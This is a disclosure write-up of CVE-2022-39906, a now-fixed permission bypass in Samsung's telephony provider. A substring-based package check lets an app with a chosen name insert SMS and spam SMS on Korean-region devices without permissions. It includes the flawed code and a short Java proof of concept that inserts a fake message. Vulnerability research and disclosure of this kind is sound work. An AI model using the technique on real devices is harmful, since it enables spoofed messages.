# Details

<table>
    <tr>
        <td>Name</td>
        <td>Phone and Messaging Storage</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.providers.telephony</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.16</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39906">CVE-2022-39906</a> (SVE-2022-2284)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$200</td>
    </tr>
</table>

# Description

The Phone and Messaging Storage app was developed by AOSP, but patched by Samsung. Additional security checks were added to it, one of which was in the `com/android/providers/telephony/secutil/SecProviderUtil.java` file:
```java
public static boolean isAllowAccess(String callingPackage) {
    if (MessageFeature.SEC_TP_TRANSACTION_CUSTOMIZE_KOREA) {
        return MMS_PKG.contains(callingPackage) || "com.samsung.android.scloud".contains(callingPackage); // <<<
    }
    return false;
}
```

This code was used when checking access rights in the `com/android/providers/telephony/ProviderUtil.java` file:
```java
public static boolean isAccessRestricted(Context context, String callingPackage, int callingUid) {
    if (MessageFeature.SEC_TP_TRANSACTION_CUSTOMIZE_KOREA) {
        if (callingPackage == null) {
            return true;
        }
        if (SecProviderUtil.isAllowAccess(callingPackage)) { // <<<
            return false;
        }
    }
    return (callingUid == 1000 || callingUid == 1001 || SmsApplication.isDefaultSmsApplication(context, callingPackage)) ? false : true;
}
```

Further, this method was used in all of the provider's write methods:
```xml
<provider android:name="com.android.providers.telephony.SmsProvider" android:readPermission="android.permission.READ_SMS" android:exported="true" android:multiprocess="false" android:authorities="sms;spamsms" android:singleUser="true" />
```

This means that if the user's device is from Korea (the salescode must be one of `SKC`, `KTC`, `LUC`, `KOO`, `SKT`, `SKO`, `KTT`, `KTO`, `LGT`, `LUO`, `K06`, `K01`) and the attacker calls their app, for example, `com.samsung.android.scl`, they will be able to create SMS and spam SMS without having any permissions.

**Proof of Concept**

```java
ContentValues values = new ContentValues();
values.put(Telephony.Sms.ADDRESS, "1337");
values.put(Telephony.Sms.DATE, SystemClock.currentThreadTimeMillis());
values.put(Telephony.Sms.BODY, "Evil body");
getContentResolver().insert(Telephony.Sms.CONTENT_URI, values);
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
